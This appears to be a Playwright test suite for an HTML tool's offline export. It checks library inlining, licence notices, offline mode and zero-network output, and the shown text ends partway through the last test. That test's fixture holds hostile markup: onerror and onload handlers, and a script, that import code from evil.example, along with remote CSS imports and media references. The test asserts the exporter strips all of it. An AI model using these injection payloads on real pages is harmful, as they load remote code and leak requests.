import { test, expect } from "@playwright/test";
import { execFileSync } from "child_process";
import fs from "fs";
import net from "net";
import path from "path";
import {
  SKILL, PYTHON, fileUrl, ready, stageContent, startStaticServer,
  installClipboardCapture, openToolbarMenu, openSidebarExportMenu, addTextComment, readDownload, stageNonShareable,
  clickSidebarExport,
} from "./helpers.js";
import {
  CONTENT, routeRichContentLocal, makeTmpDir, installDownloadTextCapture, capturedDownloadText,
  layerDescriptor, realLayerDescriptorScripts, insertLayerDecoy, CONTENT_END,
  expectForwardCompatibleContract, mediaLoadAttributes, networkLoadRefs, cspMetaContent, attrOfId,
} from "./_offline-export.js";

test("Export Offline embeds vendored mermaid and Chart.js for zero-network reopen (CMH-OFFLINE-01, CMH-OFFLINE-02)", async ({ page, browser }) => {
  test.setTimeout(60000);
  expect(networkLoadRefs(CONTENT)).toEqual(expect.arrayContaining([
    "https://example.com/tracker.png",
    "https://example.com/tracker-2x.png",
    "https://example.com/beacon.html",
  ]));
  const staged = stageContent(CONTENT, { key: "cmh-offline-export", source: "offline-export.html" });
  fs.writeFileSync(staged.html, insertLayerDecoy(fs.readFileSync(staged.html, "utf8")));
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
    await page.waitForFunction(() => !!(window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart")), null, { timeout: 20000 });

    await openToolbarMenu(page);
    await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
    await page.keyboard.press("Escape");
    await addTextComment(page, "#offline-note", "offline note with import('https://evil.example/x.js') survives");
    await expect(page.locator("#btnSidebarExportMenu")).toBeVisible();
    await openSidebarExportMenu(page);
    await expect(page.locator("#btnExportOffline")).toBeVisible();

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expectForwardCompatibleContract(exportedHtml, "offline");
    expect(realLayerDescriptorScripts(exportedHtml)).toHaveLength(1);
    expect(exportedHtml).toContain('<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>');
    expect(exportedHtml).toContain('id="embeddedComments"');
    expect(exportedHtml).toContain('<canvas id="offlineChart"');
    expect(exportedHtml).not.toContain('data-cm-offline-chart="true"');
    expect(exportedHtml).not.toContain('<img id="offlineChart"');
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/chart.js");
    expect(exportedHtml).not.toContain("bare-module.js");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-export.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => {
      if (/^https?:\/\//.test(request.url())) external.push(request.url());
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-live", "polite");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-label", /Offline: self-contained and works with no network/);
    await expect(page2.locator("#commentList")).toContainText("offline note with import('https://evil.example/x.js') survives");

    const mediaState = await page2.evaluate(() => {
      const img = document.getElementById("remoteTracker");
      const iframe = document.getElementById("remoteFrame");
      return {
        imgSrc: img && img.getAttribute("src"),
        imgSrcset: img && img.getAttribute("srcset"),
        iframeSrc: iframe && iframe.getAttribute("src"),
      };
    });
    expect(mediaState.imgSrc || "").not.toMatch(/^(?:https?:)?\/\//i);
    expect(mediaState.imgSrcset).toBeNull();
    expect(mediaState.iframeSrc).toBeNull();

    const mermaid = page2.locator("#commentRoot pre.mermaid svg").first();
    await expect(mermaid).toBeVisible();
    await page2.locator("#commentRoot pre.mermaid svg g.node").first().hover();
    await expect(page2.locator("#mermaidAddBtn")).toBeVisible();

    const chart = page2.locator("canvas#offlineChart");
    await expect(chart).toBeVisible();
    const chartMetrics = await page2.evaluate(() => {
      const canvas = document.getElementById("offlineChart");
      const chart = window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart");
      if (!canvas || !chart) return null;
      const rect = canvas.getBoundingClientRect();
      const active = [{ datasetIndex: 0, index: 1 }];
      if (chart.setActiveElements) chart.setActiveElements(active);
      if (chart.tooltip && chart.tooltip.setActiveElements) {
        chart.tooltip.setActiveElements(active, {
          x: rect.left + rect.width / 2,
          y: rect.top + 20,
        });
      }
      chart.update("none");
      return {
        width: rect.width,
        height: rect.height,
        tooltipOpacity: chart.tooltip && typeof chart.tooltip.opacity === "number" ? chart.tooltip.opacity : 0,
        datasets: chart.data && chart.data.datasets ? chart.data.datasets.length : 0,
        chartAreaWidth: chart.chartArea ? chart.chartArea.right - chart.chartArea.left : 0,
      };
    });
    expect(chartMetrics).toBeTruthy();
    expect(chartMetrics.datasets).toBe(1);
    expect(chartMetrics.width).toBeGreaterThan(20);
    expect(chartMetrics.height).toBeGreaterThan(20);
    expect(chartMetrics.chartAreaWidth).toBeGreaterThan(20);
    expect(chartMetrics.tooltipOpacity).toBeGreaterThan(0);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("CMH-SIZE-05: an Offline export keeps its inlined libraries out of the head, inside the machinery fence", async ({ page, browser }) => {
  test.setTimeout(90000);
  // The Offline export inlines ~1 MB of minified mermaid + Chart.js. Appending that to `<head>`
  // regrew exactly the megabyte-before-the-title head the content-first layout exists to remove, so
  // a tool reading the first 50 KB of an offline file met the bundle instead of the prose. The
  // libraries, their MIT notices and any hoisted author chart script now go AFTER the authored
  // content, inside the machinery fence, in an order that still defines a library before the author
  // code that calls it.
  const staged = stageContent(CONTENT, { key: "cmh-offline-fence", source: "offline-fence.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const html = await capturedDownloadText(page);

    // Nothing this exporter generates lands in the head any more.
    const headEnd = html.search(/<\/head>/i);
    expect(headEnd).toBeGreaterThan(-1);
    const head = html.slice(0, headEnd);
    expect(head).not.toContain("data-cmh-offline-lib");
    expect(head).not.toContain("Third-party notice - ");
    // The CSP meta is still the head's FIRST child: a policy is not retroactive, so anything the
    // parser sees before it is unpoliced.
    expect(html).toMatch(/<head\b[^>]*>\s*<meta\s+http-equiv="Content-Security-Policy"/i);

    const fenceBegin = html.indexOf("BEGIN: commentable-html - MACHINERY");
    const fenceEnd = html.indexOf("<!-- END: commentable-html - MACHINERY -->");
    const contentEnd = html.indexOf(CONTENT_END);
    expect(contentEnd).toBeGreaterThan(-1);
    expect(fenceBegin).toBeGreaterThan(contentEnd);
    expect(fenceEnd).toBeGreaterThan(fenceBegin);
    // The runtime this exporter inlines into the file must not QUOTE the fence markers: it ships
    // verbatim inside every document, so a contiguous literal would make every tool that counts
    // markers read an ordinary document as carrying two fences.
    expect((html.match(/BEGIN: commentable-html - MACHINERY/g) || []).length).toBe(1);
    expect((html.match(/END: commentable-html - MACHINERY/g) || []).length).toBe(1);

    // Each library, its notice, the Chart.js defaults shim and the mermaid init shim sit INSIDE the
    // fence, after the content.
    for (const marker of [
      'data-cmh-offline-lib="chartjs"',
      'data-cmh-offline-lib="mermaid"',
      'data-cmh-offline-lib-init="chartjs"',
      'data-cmh-offline-lib-init="mermaid"',
      "Third-party notice - Chart.js",
      "Third-party notice - mermaid",
    ]) {
      const at = html.indexOf(marker);
      expect(at, marker).toBeGreaterThan(fenceBegin);
      expect(at, marker).toBeLessThan(fenceEnd);
    }
    // Each MIT notice still travels immediately before the bytes it licenses.
    expect(html.indexOf("Third-party notice - Chart.js")).toBeLessThan(html.indexOf('data-cmh-offline-lib="chartjs"'));
    expect(html.indexOf("Third-party notice - mermaid")).toBeLessThan(html.indexOf('data-cmh-offline-lib="mermaid"'));
    // The library is DEFINED before the author code that constructs a chart with it, and each init
    // shim after the bytes it drives.
    expect(html.indexOf('data-cmh-offline-lib="chartjs"')).toBeLessThan(html.indexOf("new Chart(el, {"));
    expect(html.indexOf("new Chart(el, {")).toBeLessThan(fenceEnd);
    expect(html.indexOf('data-cmh-offline-lib="chartjs"')).toBeLessThan(html.indexOf('data-cmh-offline-lib-init="chartjs"'));
    expect(html.indexOf('data-cmh-offline-lib-init="chartjs"')).toBeLessThan(html.indexOf("new Chart(el, {"));
    expect(html.indexOf('data-cmh-offline-lib="mermaid"')).toBeLessThan(html.indexOf('data-cmh-offline-lib-init="mermaid"'));

    // The measured property this exists for: the first 50 KB is the title and the opening of the
    // content, not a minified library or a base64 payload.
    const first50k = html.slice(0, 50 * 1024);
    expect(first50k).toContain("<title>");
    expect(first50k).toContain("<h1>Offline export</h1>");
    expect(first50k).toContain("This paragraph proves embedded comments travel in the offline file.");
    expect(first50k).not.toContain("data-cmh-offline-lib");
    expect(first50k).not.toContain("cmhVendoredRichLibs");

    const exportedPath = path.join(outDir, "offline-fence.html");
    fs.writeFileSync(exportedPath, html);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    // Relocating the libraries must not cost the file its zero-network rendering.
    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => {
      if (/^https?:\/\//.test(request.url())) external.push(request.url());
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#commentRoot pre.mermaid svg").first()).toBeVisible();
    expect(await page2.evaluate(() => {
      const chart = window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart");
      return {
        datasets: chart && chart.data && chart.data.datasets ? chart.data.datasets.length : 0,
        // The runtime's own `setupChartContainment` only sees the global when the library precedes
        // it, which the head placement guaranteed and the fence tail does not - so the exporter
        // re-asserts these two defaults beside the bytes. Assert the EFFECT, not just the marker.
        responsive: !!(window.Chart && window.Chart.defaults && window.Chart.defaults.responsive),
        maintainAspectRatio: !!(window.Chart && window.Chart.defaults && window.Chart.defaults.maintainAspectRatio),
      };
    })).toEqual({ datasets: 1, responsive: true, maintainAspectRatio: false });
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("CMH-SIZE-05: the fence placement keeps its boundaries - the hoist, the notice sweep and the no-fence fallback", async ({ page, browser }) => {
  test.setTimeout(180000);
  // Three behaviors the relocation introduces, each with a boundary that has to hold:
  //   1. a script OUTSIDE the authored content that only REFERENCES the `Chart` global is now
  //      hoisted after the inlined library (it used to be left alone once it was in the body,
  //      because the library was in the head and already ran first) - while one INSIDE the content
  //      that merely mentions the word is left exactly where it is, because moving it would shift
  //      the text offsets every saved comment anchor is measured against;
  //   2. the stale-notice sweep reaches the machinery region, but never an authored notice-looking
  //      comment inside the content;
  //   3. a document with NO fence (a pre-1.833 or retrofitted host) still exports, with the
  //      libraries after all authored content at the end of the body.
  const FENCE_END = "<!-- END: commentable-html - MACHINERY -->";
  const STALE_NOTICE = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nSTALE FENCE NOTICE\n-->";
  const AUTHORED_NOTICE = "<!-- Third-party notice - someotherlib is bundled inline for offline use under the MIT License:\nAUTHORED IN CONTENT\n-->";
  const content = '<script>/* cmh-in-content-mention */ var note = "Chart of accounts";</script>\n'
    + CONTENT
    + AUTHORED_NOTICE;
  const staged = stageContent(content, { key: "cmh-offline-boundaries", source: "offline-boundaries.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    const base = fs.readFileSync(staged.html, "utf8");
    expect(base).toContain(FENCE_END);
    // A machinery-region script that only READS the global, plus a stale notice this exporter would
    // have written on an earlier pass.
    const machinery = STALE_NOTICE
      + '\n<script>/* cmh-machinery-config */ if (window.Chart) { Chart.defaults.font.size = 14; }</script>\n'
      + '<script>/* cmh-alias-define */ const cmhAliasC = window.Chart;</script>\n'
      + '<script>/* cmh-alias-use */ window.__aliasOk = typeof cmhAliasC === "function";</script>\n';
    fs.writeFileSync(staged.html, base.replace(FENCE_END, machinery + FENCE_END));

    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
    await openToolbarMenu(page);
    await page.locator("#btnExportOfflineTop").click();
    const html = await capturedDownloadText(page);

    const contentEnd = html.indexOf(CONTENT_END);
    const chartLib = html.indexOf('data-cmh-offline-lib="chartjs"');
    expect(contentEnd).toBeGreaterThan(-1);
    expect(chartLib).toBeGreaterThan(-1);
    // 1. The machinery-region config script moved after the library; the in-content script that only
    //    MENTIONS the word in a string did not move at all - it sits before any Chart-using sibling,
    //    so nothing drags it and its text offsets (which every saved comment anchor is measured
    //    against) are untouched.
    expect(html.indexOf("cmh-machinery-config")).toBeGreaterThan(chartLib);
    expect(html.indexOf("cmh-in-content-mention"), "an in-content mention is not relocated")
      .toBeLessThan(contentEnd);
    // 1b. A SPLIT alias/use pair keeps its order: the definer matches and moves, and its sibling
    //     user - which names no `Chart` token at all - goes with it rather than being stranded
    //     above the library, where `C` would still be in its temporal dead zone.
    expect(html.indexOf("cmh-alias-define")).toBeGreaterThan(chartLib);
    expect(html.indexOf("cmh-alias-use")).toBeGreaterThan(html.indexOf("cmh-alias-define"));
    // 2. The stale machinery notice is gone; the authored one inside the content survives verbatim.
    expect(html).not.toContain("STALE FENCE NOTICE");
    expect(html).toContain("AUTHORED IN CONTENT");
    expect((html.match(/Third-party notice - mermaid/g) || []).length).toBe(1);

    // 3. The same document with its fence markers removed still exports, content-first.
    const noFence = base
      .replace(FENCE_END, "")
      .replace(/^[ \t]*BEGIN: commentable-html - MACHINERY[ \t]*$/m, "     (machinery)");
    expect(noFence).not.toContain(FENCE_END);
    const noFencePath = path.join(staged.dir, "no-fence.html");
    fs.writeFileSync(noFencePath, noFence);
    await page.goto(server.url + "/no-fence.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
    await openToolbarMenu(page);
    await page.locator("#btnExportOfflineTop").click();
    await page.waitForFunction(() => window.__cmhDownloadTexts && window.__cmhDownloadTexts.length > 0);
    const fenceless = await capturedDownloadText(page);
    const felessHead = fenceless.slice(0, fenceless.search(/<\/head>/i));
    expect(felessHead).not.toContain("data-cmh-offline-lib");
    expect(fenceless.indexOf('data-cmh-offline-lib="mermaid"')).toBeGreaterThan(fenceless.indexOf(CONTENT_END));
    expect(networkLoadRefs(fenceless)).toEqual([]);

    const fencelessPath = path.join(outDir, "offline-no-fence.html");
    fs.writeFileSync(fencelessPath, fenceless);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", fencelessPath], { cwd: SKILL, stdio: "pipe" });
    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => {
      if (/^https?:\/\//.test(request.url())) external.push(request.url());
    });
    await page2.goto(fileUrl(fencelessPath));
    await ready(page2);
    await expect(page2.locator("#commentRoot pre.mermaid svg").first()).toBeVisible();
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline embeds the MIT license notice beside each inlined library (CMH-LICENSE-02)", async ({ page }) => {
  test.setTimeout(90000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-notice", source: "offline-notice.html" });
  // Seed a STALE library notice into the document head on disk (as a hypothetical earlier offline
  // pass would leave). The offline export's base HTML carries it, so this exercises the idempotency
  // strip: _stripOfflineRichRenderers must drop the stale notice before the export re-emits one.
  const staleNotice = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nSTALE DUPLICATE\n-->";
  fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace("</head>", staleNotice + "\n</head>"));
  const server = await startStaticServer(staged.dir);
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await addTextComment(page, "#offline-note", "notice check");
    await openSidebarExportMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    // Both libraries are inlined for this doc, so both MIT notices must travel with them, each inside
    // an HTML comment (a notice, not executable content) that carries the verbatim upstream copyright.
    const comments = [...exportedHtml.matchAll(/<!--([\s\S]*?)-->/g)].map((m) => m[1]);
    const mermaidNotice = comments.find((c) => c.includes("Third-party notice - mermaid"));
    const chartNotice = comments.find((c) => c.includes("Third-party notice - Chart.js"));
    expect(mermaidNotice, "mermaid MIT notice comment").toBeTruthy();
    expect(chartNotice, "Chart.js MIT notice comment").toBeTruthy();
    expect(mermaidNotice).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(mermaidNotice).toContain("Permission is hereby granted");
    expect(chartNotice).toContain("Copyright (c) 2014-2024 Chart.js Contributors");
    expect(chartNotice).toContain("Permission is hereby granted");
    // Idempotent: exactly one notice per library - the seeded stale mermaid notice was stripped and
    // re-emitted once, never duplicated.
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
    expect(exportedHtml).not.toContain("STALE DUPLICATE");
    // The notice is a comment, never an executed script, so it cannot run and stays under the CSP.
    expect(exportedHtml).not.toContain("Third-party notice - mermaid is bundled inline for offline use under the MIT License:</script>");
  } finally {
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("editing an already-offline document preserves offline mode and offline export is idempotent (CMH-OFFLINE-03)", async ({ page }) => {
  const offlineContent = `
<h1>Already offline</h1>
<p id="offline-preserve-note">Offline files can still collect review notes.</p>
<figure class="chart">
  <div class="chart-wrap cm-skip">
    <img id="offlinePreservedChart" class="cmh-chart" data-cm-offline-chart="true"
      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/l1pK4wAAAABJRU5ErkJggg=="
      alt="Offline chart snapshot" width="1" height="1">
  </div>
  <figcaption>Offline chart snapshot.</figcaption>
</figure>`;
  const staged = stageContent(offlineContent, { key: "cmh-offline-preserve", source: "offline-preserve.html" });
  const html = fs.readFileSync(staged.html, "utf8")
    .replace('"mode":"shareable"', '"mode":"offline"', 1);
  fs.writeFileSync(staged.html, html);
  try {
    await installClipboardCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await expect(page.locator("#cmTypeBadge")).toHaveText("Offline");
    await addTextComment(page, "#offline-preserve-note", "preserve this offline note");

    const [shareableDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnSaveHtml"),
    ]);
    const shareableHtml = await readDownload(shareableDownload);
    expect(layerDescriptor(shareableHtml).mode).toBe("offline");
    expect(shareableHtml).toContain("preserve this offline note");
    expect(shareableHtml).toContain('data-cm-offline-chart="true"');
    expect(mediaLoadAttributes(shareableHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(shareableHtml)).toEqual([]);

    const [offlineDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const offlineHtml = await readDownload(offlineDownload);
    expect(layerDescriptor(offlineHtml).mode).toBe("offline");
    expect((offlineHtml.match(/data-cm-offline-chart="true"/g) || []).length).toBe(1);
    expect(mediaLoadAttributes(offlineHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(offlineHtml)).toEqual([]);
    expect(offlineHtml).not.toContain('<canvas id="offlinePreservedChart"');
    expect(offlineHtml).toContain("preserve this offline note");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("a document that declares the companion-file mode is never read as Offline (CMH-OFFLINE-09)", async ({ page }) => {
  // The legacy `#commentRoot [data-cm-offline-chart]` signal (CMH-OFFLINE-02) is evidence only
  // for a document that COULD be offline. A NonShareable document loads its layer from companion
  // files, so it is not self-contained and can never be offline - which is why the validator
  // raises no offline-mode error for one and now refuses the snapshot outright.
  //
  // The fixture keeps the layer INLINE (only the descriptor declares nonshareable) because that
  // is what makes the runtime's reading observable at all: `currentDocState()` short-circuits to
  // "Not shareable" for any document that really loads companion files, which is exactly why
  // this divergence stayed hidden.
  const snapshotContent = `
<h1>Companion-file document</h1>
<p id="companion-note">This document declares the companion-file mode.</p>
<figure class="chart">
  <div class="chart-wrap cm-skip">
    <img id="companionChart" class="cmh-chart" data-cm-offline-chart="true"
      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/l1pK4wAAAABJRU5ErkJggg=="
      alt="Offline chart snapshot" width="1" height="1">
  </div>
  <figcaption>Chart snapshot in a document that declares nonshareable.</figcaption>
</figure>`;
  const staged = stageContent(snapshotContent, { key: "cmh-nonshareable-chart", source: "nonshareable-chart.html" });
  const original = fs.readFileSync(staged.html, "utf8");
  try {
    await installClipboardCapture(page);
    // Both spellings: the pre-rename `nonportable` is what a legacy companion-file document
    // actually carries, so it is the shape this rule most needs to reach.
    for (const mode of ["nonshareable", "nonportable"]) {
      const declared = original.replace('"mode":"shareable"', `"mode":"${mode}"`, 1);
      expect(declared).toContain(`"mode":"${mode}"`);
      fs.writeFileSync(staged.html, declared);
      await page.goto(fileUrl(staged.html) + `?mode=${mode}`);
      await ready(page);
      // Prove the reload really picked up THIS spelling, so the second pass cannot pass on a
      // cached copy of the first.
      expect(await page.evaluate(() => JSON.parse(
        document.getElementById("commentableHtmlLayer").textContent).mode)).toBe(mode);
      await expect(page.locator("#cmTypeBadge")).not.toHaveText("Offline");
      await expect(page.locator("#cmTypeBadge")).toHaveText("Shareable");

      // The durable half: a Save restamps the descriptor from the same reading, so the mode
      // written into the downloaded file must not claim offline either.
      await openToolbarMenu(page);
      const [download] = await Promise.all([
        page.waitForEvent("download"),
        page.locator("#btnSaveHtmlTop").click(),
      ]);
      const savedHtml = await readDownload(download);
      expect(layerDescriptor(savedHtml).mode).toBe("shareable");
      expect(savedHtml).toContain('data-cm-offline-chart="true"');
      // And the residual CMH-OFFLINE-09 declares rather than hides: the saved copy no longer
      // declares a companion-file mode, so re-opening it reads Offline from the legacy snapshot
      // signal again - the `shareable` + snapshots shape the validator (not the runtime) owns.
      const savedPath = path.join(staged.dir, `saved-${mode}.html`);
      fs.writeFileSync(savedPath, savedHtml);
      await page.goto(fileUrl(savedPath));
      await ready(page);
      await expect(page.locator("#cmTypeBadge")).toHaveText("Offline");
    }

    // Control: the legacy fallback survives. Drop the declared mode entirely - the shape
    // CMH-OFFLINE-02 promises to keep reading - and the same snapshot still yields Offline.
    const legacy = original.replace('"mode":"shareable",', "", 1);
    expect(legacy).not.toContain('"mode"');
    fs.writeFileSync(staged.html, legacy);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await expect(page.locator("#cmTypeBadge")).toHaveText("Offline");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and event-handler egress (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_EGRESS = `
<h1>Offline zero network</h1>
<style>
@import "https://evil.example/imported.css";
@import "https:evil.example/scheme-only-imported.css";
@import"https://evil.example/nospace-imported.css";
@import "https://evil.example/media-imported.css" screen;
.remote-bg { background-image: url("//evil.example/bg.png"); }
.scheme-only-bg { background-image: url(https:evil.example/scheme-only-bg.png); }
.quoted-paren-bg { background-image: url("https:evil.example/paren)bg.png"); }
</style>
<link rel="prefetch" href="https://evil.example/prefetch.js">
<link rel="prerender" href="https://evil.example/prerender.html">
<meta http-equiv="refresh" content="9999; url=https://evil.example/refresh">
<p id="egress-note">Offline export must strip every load vector.</p>
<img id="sameOriginBeacon" alt="same origin beacon" src="__SAME_ORIGIN__/same-origin.png">
<img id="handlerProbe" alt="handler probe" src="data:image/gif;base64,AA" onerror="import('https://evil.example/onerror.js')">
<svg width="20" height="20" aria-label="foreign handler probe"><rect id="foreignHandlerProbe" width="20" height="20" onload="import('https://evil.example/foreign-handler.js')"/></svg>
<noscript><button id="noscriptHandlerProbe" onclick="import('https://evil.example/noscript-handler.js')">go</button></noscript>
<noscript><style id="noscriptStyleProbe">@import "https://evil.example/noscript-imported.css";
.noscript-bg { background-image: url("//evil.example/noscript-bg.png"); }</style>
<div id="noscriptInlineStyleProbe" style="background-image:url('https:evil.example/noscript-inline.png')">fallback</div></noscript>
<svg width="20" height="20" aria-label="remote svg refs">
  <image href="https://evil.example/vector.png" width="20" height="20"></image>
  <use href="https://evil.example/sprite.svg#icon"></use>
  <image xlink:href="https://evil.example/vector-xlink.png" width="20" height="20"></image>
  <use xlink:href="https://evil.example/sprite-xlink.svg#icon"></use>
  <image id="svgImageSrc" src="https://evil.example/svg-image-src.png" width="20" height="20"></image>
  <image id="svgImageSrcset" srcset="https://evil.example/svg-image-srcset.png 1x" width="20" height="20"></image>
  <image id="svgImageKeep" href="local-vector.png" src="local-image-src.png" width="20" height="20"></image>
</svg>
<image id="htmlImageSrc" src="https://evil.example/html-image-src.png" alt="html image src">
<image id="htmlImageSrcset" srcset="https://evil.example/html-image-srcset.png 1x" alt="html image srcset">
<video poster="https://evil.example/poster.png"><track src="https://evil.example/captions.vtt"></video>
<video src="https://evil.example/video.mp4"><source src="https://evil.example/video-source.mp4" srcset="https://evil.example/video-2x.png 2x"></video>
<audio src="https://evil.example/audio.mp3"><source src="https://evil.example/audio-source.ogg"></audio>
<input type="image" alt="submit" src="https://evil.example/input.png">
<div background="https://evil.example/background.png">legacy background</div>
<svg width="20" height="20" aria-label="presentation refs">
  <defs><clipPath id="localClip"><rect width="5" height="5"/></clipPath></defs>
  <rect id="presentationProbe" width="20" height="20" clip-path="url(https://evil.example/clip.svg#c)" mask="url(https:evil.example/mask.svg#m)" fill="url(//evil.example/paint.svg#g)" stroke="url(https://evil.example/stroke.svg#s)" filter="url(https://evil.example/filter.svg#f)" marker-end="url(https://evil.example/marker.svg#m)" cursor="url(https://evil.example/pointer.cur), auto"/>
  <rect id="presentationKeep" width="20" height="20" clip-path="url(#localClip)" fill="#336699"/>
</svg>
<noscript><svg width="20" height="20" aria-label="fallback presentation ref"><rect id="noscriptPresentationProbe" width="20" height="20" mask="url(https://evil.example/noscript-mask.svg#m)"/></svg></noscript>
<script>const u = "https://evil.example/dynamic-import.js"; import(u);</script>`;
  const staged = stageContent(CONTENT_WITH_EGRESS, { key: "cmh-offline-zero-network", source: "offline-zero.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    fs.writeFileSync(path.join(staged.dir, "same-origin.png"), Buffer.from("not a real image"));
    fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(/__SAME_ORIGIN__/g, server.url));
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    const csp = cspMetaContent(exportedHtml);
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("script-src 'unsafe-inline'");
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    const handlerTag = exportedHtml.match(/<img\b[^>]*id="handlerProbe"[^>]*>/i);
    expect(handlerTag && handlerTag[0]).toBeTruthy();
    expect(handlerTag[0]).not.toMatch(/\sonerror\s*=/i);
    // The two shapes only a DOM WALK reaches: a self-closed FOREIGN element, and an element inside
    // a <noscript> body (markup to the DOMParser the export re-parses with, since scripting is off
    // there). The strict validator reads both off its egress tag index, so the export and the gate
    // it is measured by have to agree about them (CMH-OFFLINE-05).
    const foreignHandlerTag = exportedHtml.match(/<rect\b[^>]*id="foreignHandlerProbe"[^>]*>/i);
    expect(foreignHandlerTag && foreignHandlerTag[0]).toBeTruthy();
    expect(foreignHandlerTag[0]).not.toMatch(/\sonload\s*=/i);
